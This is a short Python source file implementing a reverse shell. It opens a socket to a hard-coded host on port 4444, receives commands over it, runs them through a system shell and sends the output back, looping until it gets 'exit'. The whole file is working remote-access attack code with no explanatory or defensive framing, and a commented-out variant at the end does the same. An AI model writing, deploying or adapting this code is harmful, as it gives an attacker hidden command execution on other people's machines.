from socket import *
import subprocess
import sys
import os

target_host = "192.168.1.2"
target_port = 4444

connection = socket(AF_INET,SOCK_STREAM)
connection.connect((target_host,target_port))
commandfolder = os.getcwd()
commandsymbol = " $> "
command_folder_and_symbol = commandfolder + commandsymbol
connection.send(command_folder_and_symbol.encode()),(target_host,target_port)



while True:

    
    command = connection.recv(2048).decode("utf-8")

    try:


        splited_command = command.split()
    
        if "exit" in command:
            connection.close()
            break

        elif splited_command[0] == "cd":

            os.chdir(splited_command[1])
            foldernew = os.getcwd()
            command_folder_and_symbol = foldernew + commandsymbol
            connection.send(command_folder_and_symbol.encode()),(target_host,target_port)
            pass
        
        else:
                
            CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            commandvar1 = CMD.stdout.read()
            commandvar2 = CMD.stderr.read()
            commandvar3 = commandvar1 + commandvar2
            connection.send(commandvar3)

            folderpath = os.getcwd()
            command_folder_and_symbol = folderpath + commandsymbol
            connection.send(command_folder_and_symbol.encode()),(target_host,target_port)

        

    except FileNotFoundError as FileError:
        connection.send(FileError)


    #try:
     #   
     #  result = run(command,stdout= PIPE,stderr=PIPE,universal_newlines=True)
     #  output = result.stdout
     #  connection.send(output.encode()),(target_host,target_port)
     #  command = connection.recv(2048).decode()
    
    #except FileNotFoundError:

    #    errorsession = "File not found,sorry sir."
    #    connection.send(errorsession.encode()),(target_host,target_port)